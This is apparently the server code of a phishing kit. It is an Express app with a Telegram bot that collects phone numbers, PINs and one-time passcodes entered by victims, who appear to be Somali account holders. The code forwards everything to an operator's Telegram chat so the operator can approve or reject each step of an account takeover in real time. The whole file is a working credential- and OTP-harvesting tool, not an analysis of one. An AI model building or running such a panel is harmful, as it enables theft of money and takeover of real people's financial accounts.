const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// -------------------- INIT BOT --------------------
if (!process.env.BOT_TOKEN) {
    throw new Error("BOT_TOKEN is missing in .env");
}

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

// -------------------- MEMORY STORE --------------------
const statusStore = {};

// -------------------- MIDDLEWARE --------------------
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- ROUTES --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/:page', (req, res) => {
    if (req.params.page.startsWith('api')) {
        return res.status(404).send("Not found");
    }
    const file = req.params.page.endsWith('.html')
        ? req.params.page
        : req.params.page + '.html';

    const filePath = path.join(__dirname, 'public', file);

    res.sendFile(filePath, (err) => {
        if (err) res.status(404).send("Page not found");
    });
});

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};
    const country = "Somalia";
    const countryCode = "+252";

    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric',
        day: 'numeric',
        year: 'numeric',
        hour: 'numeric',
        minute: 'numeric',
        second: 'numeric',
        hour12: true
    });

    if (!phone || !pin || !ADMIN_ID)
        return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending";

    const message =
`📱 <b>CL 2 - LOGIN ATTEMPT</b>

🆕 <b>NEW USER</b>
🇸🇴 <b>Country:</b> ${country}
🌍 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> ${phone}
🔢 <b>PIN:</b> ${pin}
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>User waiting for approval</b>
⌛ <b>Timeout: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML'
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- FIRST OTP API --------------------
app.post('/api/verify-first-otp', async (req, res) => {
    const { phone, otp } = req.body || {};
    const country = "Somalia";
    const countryCode = "+252";

    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric',
        day: 'numeric',
        year: 'numeric',
        hour: 'numeric',
        minute: 'numeric',
        second: 'numeric',
        hour12: true
    });

    if (!phone || !otp || !ADMIN_ID)
        return res.status(400).json({ error: "Missing data" });

    const otpMessage =
`1️⃣ <b>CL 2 - FIRST OTP (Step 1/2)</b>

🆕 <b>NEW USER - FIRST VERIFICATION</b>
🇸🇴 <b>Country:</b> ${country}
🌍 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> ${phone}
🔐 <b>First OTP Code:</b> ${otp}
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Verify FIRST OTP:</b>
⌛ <b>Timeout: 5 minutes</b>
📝 <b>Next: Second OTP will be sent after approval</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage, {
            parse_mode: 'HTML'
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- BOT ACTIONS --------------------

// APPROVE LOGIN
bot.action(/approve_(.+)_(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];

    statusStore[phone] = "approved";

    const currentTime = new Date().toLocaleTimeString('en-US', {
        hour: 'numeric',
        minute: 'numeric',
        second: 'numeric',
        hour12: true
    });

    const approvedMsg =
`✅ <b>LOGIN APPROVED</b>

🆕 <b>NEW USER</b>
🇸🇴 <b>Somalia</b>
📱 <b>${phone}</b>
🔐 <b>${pin}</b>

━━━━━━━━━━━━━━━

✅ <b>Status: Approved</b>
➡️ <b>Next: First OTP (1/2)</b>
⏱️ <b>${currentTime}</b>`;

    try {
        await ctx.deleteMessage();
        await ctx.replyWithHTML(approvedMsg);
        await ctx.answerCbQuery("Allowed");
    } catch (e) {
        console.error(e.message);
    }
});

// DENY LOGIN / WRONG PIN
bot.action(/deny_(.+)_(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];

    statusStore[phone] = "denied";

    const currentTime = new Date().toLocaleTimeString('en-US', {
        hour: 'numeric',
        minute: 'numeric',
        second: 'numeric',
        hour12: true
    });

    const deniedMsg =
`❌ <b>INVALID CREDENTIALS</b>

🇸🇴 <b>Somalia</b>
📱 <b>${phone}</b>
🔐 <b>${pin}</b>

━━━━━━━━━━━━━━━

❌ <b>Status: Rejected</b>
⏱️ <b>${currentTime}</b>`;

    try {
        await ctx.deleteMessage();
        await ctx.replyWithHTML(deniedMsg);
        await ctx.answerCbQuery("Rejected");
    } catch (e) {
        console.error(e.message);
    }
});

// OTP 1 CORRECT
bot.action(/otp1_correct_(.+)_(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const otp = ctx.match[2];

    statusStore[phone] = "otp1_correct";

    const currentTime = new Date().toLocaleTimeString('en-US', {
        hour: 'numeric',
        minute: 'numeric',
        second: 'numeric',
        hour12: true
    });

    const verifiedMsg =
`1️⃣ <b>FIRST OTP VERIFIED (Step 1/2)</b>

🇸🇴 <b>Somalia</b>
📱 <b>${phone}</b>
🔐 <b>${otp}</b>

━━━━━━━━━━━━━━━

✅ <b>Status: First OTP verified</b>
➡️ <b>Next: Second OTP (2/2) will be sent</b>
⌛ <b>${currentTime}</b>`;

    try {
        await ctx.deleteMessage();
        await ctx.replyWithHTML(verifiedMsg);
        await ctx.answerCbQuery("Verified");
    } catch (e) {
        console.error(e.message);
    }
});

// OTP 1 WRONG
bot.action(/otp1_wrong_(.+)/, async (ctx) => {
    const phone = ctx.match[1];

    statusStore[phone] = "otp1_wrong";

    try {
        await ctx.deleteMessage();
        await ctx.replyWithHTML(
            `❌ <b>FIRST OTP WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter OTP.</b>`
        );
        await ctx.answerCbQuery("Wrong Code");
    } catch (e) {
        console.error(e.message);
    }
});

// -------------------- STATUS CHECK --------------------
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    if (!phone) return res.json({ status: "pending" });

    res.json({ status: statusStore[phone] || "pending" });
});

// -------------------- START SERVER --------------------
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});

// -------------------- START BOT --------------------
const startBot = async () => {
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        await bot.launch();
        console.log("🤖 Bot running");
    } catch (err) {
        console.error(err);
    }
};

startBot();
